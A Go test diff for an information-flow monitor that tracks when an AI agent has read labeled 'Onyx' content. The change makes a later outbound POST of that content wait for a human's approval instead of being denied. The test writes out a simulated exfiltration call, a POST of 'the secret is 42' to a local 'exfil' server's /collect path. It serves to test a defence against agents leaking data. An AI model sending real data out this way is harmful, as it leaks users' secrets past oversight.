@@ -20,13 +20,14 @@ import (
 // flowCred is a minimal process identity for the flow monitor.
 type flowCred struct{ pid string }
 
-// After the agent reads Onyx, it must not be able to post that content out.
-// This exercises the whole kernel flow path end to end over the real drivers:
-// the labeled core.httpTemplate search taints the run automatically (no manual
-// WithTaint), and a subsequent core.internet POST that forbids the label is
-// denied by the reference monitor before the request ever leaves — the model
-// cannot launder the content out because the taint is on the run, not the bytes.
-func TestFlowBlocksOnyxToInternetExfil(t *testing.T) {
+// After the agent reads Onyx, it must not be able to post that content out
+// without a human's approval. This exercises the whole kernel flow path end to
+// end over the real drivers: the labeled core.httpTemplate search taints the
+// run automatically (no manual WithTaint), and a subsequent core.internet POST
+// that forbids the label parks for approval before the request ever leaves —
+// the model cannot launder the content out because the taint is on the run,
+// not the bytes.
+func TestFlowParksOnyxToInternetExfil(t *testing.T) {
 	var onyxHits, exfilHits atomic.Int64
 	onyx := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
 		onyxHits.Add(1)
@@ -66,20 +67,23 @@ func TestFlowBlocksOnyxToInternetExfil(t *testing.T) {
 		t.Fatalf("add internet: %v", err)
 	}
 
-	// The canonical flow chain over the drivers: Guard → Stamp → drivers, both
-	// halves reading the same index the routing dispatcher does. The guard
-	// accumulates every observed label into the run's taint and refuses a syscall
+	// The canonical flow chain over the drivers: Track → Stamp → drivers, all
+	// reading the same index. Track accumulates every observed label into the
+	// run's taint, and the routing dispatcher asks a human to approve a call
 	// whose forbidden set intersects it.
 	flow := monitor.NewFlow(monitor.NewTaints[flowCred](), config)
-	chain := flow.Guard(flow.Stamp(capability.NewDispatcher[flowCred](config)))
+	chain := flow.Track(flow.Stamp(capability.NewDispatcher[flowCred](config)))
 
-	dispatch := func(cred flowCred, name string, args map[string]any) sys.SyscallResult {
+	dispatchAs := func(cred flowCred, auth sys.Authorization, name string, args map[string]any) sys.SyscallResult {
 		raw, _ := json.Marshal(args)
-		result, err := chain.Dispatch(context.Background(), cred, sys.Syscall{Abi: sys.ABIVersion, Name: name, Args: raw}, sys.Authorization{})
+		result, err := chain.Dispatch(context.Background(), cred, sys.Syscall{Abi: sys.ABIVersion, Name: name, Args: raw}, auth)
 		if err != nil {
 			t.Fatalf("dispatch %s: %v", name, err)
 		}
 		return result
+	}
+	dispatch := func(cred flowCred, name string, args map[string]any) sys.SyscallResult {
+		return dispatchAs(cred, sys.Authorization{}, name, args)
 	}
 
 	// Baseline: on a clean run (no Onyx read), the POST is allowed — so a later
@@ -104,14 +108,21 @@ func TestFlowBlocksOnyxToInternetExfil(t *testing.T) {
 		t.Fatalf("onyx hits = %d, want 1", onyxHits.Load())
 	}
 
-	// Now the exfil attempt — even paraphrased, even in a later turn — is denied
-	// before it leaves, and the exfil server is never touched.
-	post := dispatch(agent, "core.internet",
-		map[string]any{"method": "POST", "url": exfil.URL + "/collect", "body": "the secret is 42"})
-	if post.Status() != sys.StatusFailed || post.Errno() != sys.ErrnoDenied {
-		t.Fatalf("post after Onyx read = %v/%v, want failed/denied", post.Status(), post.Errno())
+	// Now the exfil attempt — even paraphrased, even in a later turn — waits for
+	// a human before it leaves, and the exfil server is never touched.
+	post := map[string]any{"method": "POST", "url": exfil.URL + "/collect", "body": "the secret is 42"}
+	if parked := dispatch(agent, "core.internet", post); parked.Status() != sys.StatusYield {
+		t.Fatalf("post after Onyx read = %#v, want a yield for approval", parked)
 	}
 	if exfilHits.Load() != 1 {
 		t.Fatalf("SECURITY: exfil hits = %d — Onyx-derived data reached the network", exfilHits.Load())
+	}
+
+	// A human's approval sends that one request.
+	if sent := dispatchAs(agent, sys.Authorization{Decision: sys.Approved}, "core.internet", post); sent.Status() != sys.StatusResult {
+		t.Fatalf("approved post = %#v, want it sent", sent)
+	}
+	if exfilHits.Load() != 2 {
+		t.Fatalf("exfil hits = %d after the approved post, want 2", exfilHits.Load())
 	}
 }
